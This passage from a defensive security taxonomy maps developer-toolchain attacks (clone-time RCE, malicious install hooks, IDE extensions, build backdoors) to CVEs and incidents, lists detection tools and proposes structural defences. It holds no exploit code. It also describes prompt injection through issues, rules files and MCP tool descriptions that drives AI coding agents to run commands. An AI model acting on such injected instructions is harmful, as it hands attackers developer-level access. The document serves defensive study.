Real-world exploitation chains mutations across multiple toolchain components.

| Scenario | Architecture | Primary Mutation Categories | Typical Impact |
|----------|-------------|---------------------------|----------------|
| **Clone-to-RCE** | Cloning a malicious repository triggers immediate code execution | §4-1 (git submodule symlink) | Workstation compromise before code inspection |
| **Install-to-Exfiltrate** | Package installation exfiltrates credentials via lifecycle hooks | §2-1/§2-2 (npm/pip hooks) + §1-5 (setup.py) | Credential theft, lateral movement |
| **Build-to-Backdoor** | Build process injects backdoor into compiled output | §1-3 (Makefile) + §3-2 (compiler) + §9-2 (XZ Utils) | Supply chain compromise at scale |
| **Open-to-Own** | Opening a project in an IDE triggers extension-based attacks | §5-1 (VSCode ext) + §4-3 (auto-loaded configs) | Full workstation access |
| **AI-Assisted Compromise** | AI assistant processes poisoned content and executes malicious commands | §6-1 (prompt injection) + §6-2 (MCP) | Data exfiltration, RCE, credential theft |
| **Lint-to-Execute** | Running code quality tools on a project executes malicious plugin code | §7-1 (ESLint config) + §7-3 (conftest.py) | Code execution during "safe" analysis |
| **Provision-to-Pivot** | IaC tool execution on developer machine enables network pivot | §8-1 (Terraform provider) + §8-3 (Dockerfile) | Cloud credential theft, infrastructure access |
| **Bootstrap-to-Persist** | Tampered build wrapper establishes persistent access | §9-1 (Gradle wrapper) + §9-3 (PATH hijack) | Persistent backdoor surviving project cleanup |
| **Tool-as-Worm** | Compromised developer tools self-propagate via stolen credentials | §2-1 (npm hooks) + §5-1 (extension supply chain) | Exponential propagation (Shai-Hulud model) |

---

## CVE / Bug Bounty Mapping (2022–2025)

| Mutation Combination | CVE / Case | Impact / Bounty | Year |
|---------------------|-----------|----------------|------|
| §9-2 + §1-3 | **CVE-2024-3094** (XZ Utils backdoor) | CVSS 10.0. Three-year social engineering + build system backdoor. SSH RCE on affected Linux distributions. | 2024 |
| §4-1 | **CVE-2024-32002** (Git submodule symlink RCE) | CVSS 9.0. Clone-time RCE via symlink on case-insensitive filesystems. | 2024 |
| §4-1 | **CVE-2024-32004** (Git multi-user clone RCE) | Clone-time RCE on multi-user machines via crafted local repository. | 2024 |
| §5-2 | **CVE-2024-37051** (JetBrains GitHub Plugin) | CVSS 9.3. GitHub access token exposure via malicious PR content in IntelliJ IDEs. | 2024 |
| §2-5 | **CVE-2024-24787** (Go cgo Darwin RCE) | Build-time RCE on macOS when building untrusted Go modules with cgo. 7th cgo CVE. | 2024 |
| §3-1 | **CVE-2023-45133** (Babel traverse RCE) | Compile-time RCE via crafted code triggering `path.evaluate()` in Babel. | 2023 |
| §2-5 | **CVE-2023-29404, CVE-2023-29405** (Go cgo LDFLAGS) | Build-time RCE via unsanitized linker flags in cgo directives. | 2023 |
| §2-5 | **CVE-2023-39320** (Go toolchain directive) | Arbitrary code execution via crafted `go.mod` toolchain directive. | 2023 |
| §2-5 | **CVE-2025-68119, CVE-2025-4674** (Go VCS command injection) | Code execution during `go get` / `go mod download` via VCS command injection. | 2025 |
| §7-1 | **CVE-2025-54313** (eslint-config-prettier compromise) | 31M weekly downloads. Maintainer phished → malicious versions deployed → Windows RCE via `node-gyp.dll`. | 2025 |
| §6-3 | **CVE-2025-61260** (OpenAI Codex CLI RCE) | Configuration file RCE on developer machines via malicious MCP server entries. | 2025 |
| §6-2 | **CVE-2025-49596** (MCP Inspector DNS rebinding RCE) | CVSS 9.4. Browser-based RCE against Anthropic's MCP Inspector. First critical MCP ecosystem RCE. | 2025 |
| §6-2 | **CVE-2026-0755** (Gemini MCP Tool RCE) | CVSS 9.8. Command injection in gemini-mcp-tool. | 2026 |
| §6-2 | **CVE-2025-6514** (MCP NeighborJack) | 437,000+ developer environments compromised via MCP servers bound to 0.0.0.0. | 2025 |
| §6-1 | **IDEsaster** (30+ CVEs) | CVE-2025-64660, CVE-2025-61590, CVE-2025-58372, etc. Prompt injection → RCE across Cursor, Copilot, Windsurf, Zed, Roo Code, Junie, Cline. | 2025 |
| §5-1 | **GlassWorm** (VSCode Extension) | Invisible Unicode-based RAT deployed via compromised Open VSX and VSCode Marketplace extensions. | 2025 |
| §5-1 | **TigerJack** (VSCode Extension) | C++ Playground + HTTP Format extensions: 17,000+ downloads. Keylogger + crypto miner. | 2025 |
| §5-1 | **prettier-vscode-plus** (VSCode Extension) | Anivia loader + OctoRAT multi-stage attack chain via fake Prettier extension. | 2025 |
| §5-3 | **TamperedChef** (Chrome Extensions) | 16+ Chrome extensions compromised, 3.2M+ users affected via phishing. | 2025 |
| §5-3 | **Trust Wallet** (Chrome Extension) | $7–8.5M cryptocurrency theft from 2,520 wallets via leaked API key. | 2025 |
| §2-1 | **Shai-Hulud 1.0/2.0** (npm hooks) | Self-propagating worm via npm lifecycle scripts. 25,000+ repos, mass credential theft. | 2025 |
| §9-2 | **S1ngularity** (Nx build system) | AI-powered malware injected through compromised Nx monorepo build system. | 2025 |
| §8-1 | **CVE-2024-6257** (go-getter RCE) | Terraform module fetching via go-getter leads to code execution through malicious Git config. | 2024 |
| §8-1 | **CVE-2025-2180** (Checkov deserialization RCE) | Security scanner becomes attack vector: RCE when scanning malicious Terraform files. | 2025 |
| §1-2 | **Gradle Enterprise Maven Extension deserialization** | Deserialization of untrusted data via socket connection enables RCE in Gradle builds. | 2024 |
| §9-1 | **Malicious Gradle Wrapper** (multiple incidents) | Modified `gradle-wrapper.jar` injects dependencies and executes payloads during builds. | 2022–2025 |
| §6-1 | **Rules File Backdoor** (Pillar Security) | AI coding assistants weaponized via Unicode-obfuscated instructions in `.cursorrules` / Copilot instruction files. | 2025 |

---

## Detection & Defense Tools

### Offensive / Red Team Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Depfuzzer** (Synacktiv) | Multi-ecosystem dependency files | Fuzzing dependency configurations for confusion-vulnerable names |
| **Confused** | npm, pip, Maven | Checks if private package names exist on public registries |
| **npm-audit** | npm packages | Analyzes installed packages for known vulnerabilities and suspicious scripts |
| **cargo-audit** | Rust crates | Audits Cargo.lock against the RustSec Advisory Database |
| **pip-audit** | Python packages | Checks installed Python packages against known vulnerability databases |
| **Semgrep** (custom rules) | Multi-language | Pattern-based detection of dangerous build configurations and tool configs |

### Defensive / Blue Team Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Socket.dev** | npm, PyPI | Behavioral analysis of packages: detects install scripts, network calls, env access, filesystem writes |
| **Snyk** | Multi-ecosystem | SCA with lifecycle script detection and vulnerability scanning |
| **Trivy** | Containers, IaC, dependencies | Open-source scanner for container images, IaC misconfigurations, and dependency vulnerabilities |
| **StepSecurity Harden-Runner** | GitHub Actions / CI | Runtime monitoring of build processes; network egress control; baseline-driven anomaly detection |
| **Phylum** | npm, PyPI, RubyGems, NuGet | Automated analysis of package risk: install scripts, obfuscation, network behavior |
| **Stacklok Minder / Trusty** | Open-source dependencies | Reputation scoring and policy enforcement for open-source packages |
| **Scorecard** (OpenSSF) | Open-source projects | Automated security health assessment: signed releases, branch protection, dependency pinning |
| **npm --ignore-scripts** | npm | Disables all lifecycle script execution during install |
| **pip --no-build-isolation** | Python/pip | Controls build environment isolation |
| **cargo-vet** | Rust crates | Third-party dependency auditing and review tracking |
| **GitGuardian** | Source code, configs | Detects leaked credentials in repository content and tool configurations |
| **zizmor** | GitHub Actions workflows | Workflow-level vulnerability scanning |

### Research & Analysis Tools

| Tool | Purpose | Methodology |
|------|---------|-------------|
| **OSSGadget** (Microsoft) | Package analysis | Decomposes packages to detect malicious install scripts and suspicious behaviors |
| **Packj** (Ossillate) | Package vetting | Analyzes registry metadata, permissions, and behaviors before installation |
| **Sandworm** (npm audit) | npm lifecycle script analysis | Identifies packages with install scripts and maps their behavior |
| **CodeQL** | Semantic code analysis | Query-based detection of dangerous patterns in build configurations |

---

## Summary: Core Principles

### The Fundamental Problem

Developer toolchains are built on a design axiom that **configuration is code**. A `webpack.config.js` is a JavaScript program. A `build.gradle` is a Groovy program. A `setup.py` is a Python program. A `Makefile` is a shell script generator. This means that every interaction with a developer tool — cloning a repository, installing dependencies, opening a project, running a build, formatting code, executing tests — is potentially an **arbitrary code execution event**.

This is not a bug; it is the fundamental architecture. Build tools need code execution to be flexible. Package managers need lifecycle hooks to compile native extensions. Compilers need plugins to extend functionality. The code execution capability is the feature. The attack surface is inherent.

### Why Incremental Fixes Fail

Organizations applying point solutions face recurring compromises because:

1. **The execution surface is everywhere**: There is no single "install" or "build" phase to secure. Code executes at clone time (git hooks), install time (npm scripts), build time (build.rs, setup.py), edit time (IDE extensions), lint time (.eslintrc.js), test time (conftest.py), and provision time (Terraform providers). Securing one phase leaves others exposed.

2. **Trust is implicit and pervasive**: When a developer runs `npm install`, they implicitly trust every package's `postinstall` script. When they open a project in an IDE, they trust every auto-loaded configuration file. When they run `cargo build`, they trust every dependency's `build.rs`. This implicit trust model cannot be patched with per-tool fixes.

3. **AI tools amplify the attack surface**: AI coding assistants create a new class of attack where **reading untrusted data becomes code execution**. Prompt injection in a GitHub issue, a rules file, or an MCP tool description can cause an AI agent to execute arbitrary commands with developer-level permissions. This collapses the boundary between "data" and "code" even further.

4. **Self-propagation is now weaponized**: The Shai-Hulud campaign demonstrated that compromised developer tools can steal credentials and use them to propagate the compromise to other packages, creating a worm-like effect. Each compromised developer becomes a vector for compromising others.

5. **Security tools themselves are attack surfaces**: Checkov (CVE-2025-2180), the MCP Inspector (CVE-2025-49596), and ESLint-related scanning tools have all been shown to introduce code execution when processing malicious input. The tools developers use to check security become vectors for compromise.

### The Structural Solution

Effective defense against developer toolchain RCE requires **architectural changes** to the trust model:

1. **Sandboxed Build Execution**: Build tools, package install scripts, and compiler plugins should execute in sandboxed environments with no network access, restricted filesystem access, and no access to credentials. The Rust community's discussion of sandboxing `build.rs` points in the right direction — but no ecosystem has implemented this at scale.

2. **Declarative Over Imperative Configuration**: Where possible, replace executable configuration files with declarative formats. `package.json` scripts → explicit allowlists. `webpack.config.js` → structured YAML/JSON configs with plugin hash pinning. This reduces the configuration-as-code attack surface.

3. **Explicit Capability Grants**: Instead of tools having implicit access to everything, tools should require explicit capability grants: network access, filesystem access beyond the project directory, process spawning. Similar to mobile app permissions, but for build tools.

4. **AI Agent Isolation**: AI coding assistants must operate in sandboxed environments where their code execution capabilities are mediated by explicit user approval. Indirect prompt injection should not be able to trigger shell commands, file modifications, or configuration changes.

5. **Reproducible & Verifiable Builds**: SLSA framework adoption, artifact signing, and reproducible build verification should become standard. The XZ Utils backdoor was only possible because distribution tarballs differed from Git source — reproducible builds would have flagged this.

6. **Zero-Trust Tool Updates**: Extension and plugin updates should require explicit approval with change diffs, not auto-install. The VSCode Marketplace, Chrome Web Store, and JetBrains Marketplace all demonstrate that auto-update + compromised publisher = mass compromise.

The 2024-2025 attack wave demonstrates a clear trend: **the developer's local environment is now a primary target**. As CI/CD pipelines harden, attackers are shifting focus upstream to the developer workstation — where trust is highest, sandboxing is minimal, and a single compromise can propagate exponentially through the software supply chain.

---

## References

### Academic & Conference Research
- IDEsaster: 30+ CVEs in AI-Powered IDEs (Ari Marzouk, December 2025)
- "Your AI, My Shell": Prompt Injection on Agentic AI Coding Editors (arXiv:2509.22040, 2025)
- Prompt Injection Attacks on Agentic Coding Assistants (arXiv:2601.17548, 2026)
- Rules File Backdoor: How Hackers Weaponize Code Agents (Pillar Security, March 2025)
- Maven-Hijack: Supply Chain Attack Exploiting Packaging Order (arXiv:2407.18760, 2024)
- XZ Utils Backdoor Analysis (Multiple: Datadog, CrowdStrike, SentinelOne, OpenSSF, 2024)

### Industry Reports & Whitepapers
- The 2025 State of Pipeline Security (Boost Security)
- Supply Chain Attacks in Q4 2025: From Isolated Incidents to Systemic Failure Modes (Sygnia)
- Supply Chain Risk in VSCode Extension Marketplaces (Wiz, 2025)
- MCP Security Vulnerabilities (Practical DevSecOps, 2026)
- A Study on Malicious Browser Extensions in 2025 (arXiv:2503.04292)

### Vulnerability Disclosures & Advisories
- CVE-2024-3094: XZ Utils Backdoor (NVD, CVSS 10.0)
- CVE-2024-32002: Git Submodule Symlink RCE (CVSS 9.0)
- CVE-2024-37051: JetBrains IntelliJ GitHub Plugin (CVSS 9.3)
- CVE-2025-54313: eslint-config-prettier Supply Chain Compromise
- CVE-2025-49596: Anthropic MCP Inspector DNS Rebinding RCE (CVSS 9.4)
- CVE-2025-61260: OpenAI Codex CLI Configuration RCE
- CVE-2025-6514: MCP NeighborJack (437K+ environments)
- CVE-2026-0755: Gemini MCP Tool Command Injection (CVSS 9.8)
- GHSA-6j2p-252f-7mw8: Gradle Environment Variable Code Execution
- Go cgo CVE Series: CVE-2018-6574, CVE-2020-28366, CVE-2020-28367, CVE-2023-29404, CVE-2023-29405, CVE-2023-39323, CVE-2024-24787

### Practitioner Blogs & Writeups
- Go Fixes Its 7th Code Execution Bug in the Same Feature (Mattermost)
- Exploiting CVE-2024-32002: RCE via git clone (Amal Murali)
- Maven Plugins from Hell: When Your Build Hijacks Your PC (Java Code Geeks, 2025)
- Gradle Wrapper Attack Report (Gradle Blog)
- From Assistant to Adversary: Exploiting Agentic AI Developer Tools (NVIDIA Technical Blog)
- Python Package Installation Attacks (Phylum)
- NPM Security Best Practices After Shai-Hulud (Snyk)
- Sandbox build.rs and proc macros (Rust Internals Discussion)

### Tool Documentation & Frameworks
- SLSA (Supply-chain Levels for Software Artifacts) Framework
- OpenSSF Scorecard
- Sigstore (Artifact Signing)
- npm --ignore-scripts Documentation
- cargo-vet: Third-Party Dependency Review
- Rust Supply Chain Security Guide

### Major Incident Reports
- XZ Utils Backdoor Investigation (Wikipedia, OpenSSF, CrowdStrike, 2024)
- Shai-Hulud 1.0/2.0 npm Worm Campaign (Wiz, StepSecurity, Check Point, Snyk, 2025)
- GlassWorm VSCode Extension Supply Chain Attack (Koi Security, October 2025)
- TamperedChef Chrome Extension Campaign (GitLab Threat Intelligence, February 2025)
- S1ngularity Nx Build System Compromise (August 2025)
- eslint-config-prettier Hijacking (Snyk, Endor Labs, July 2025)

---

*This document was created for defensive security research, vulnerability understanding, and secure development environment architecture design purposes. The techniques described are documented to enable defenders to understand the threat landscape and implement appropriate controls.*

**Last Updated**: February 2026
**Coverage Period**: Primarily 2023–2025 incidents and research, with emerging 2026 vectors
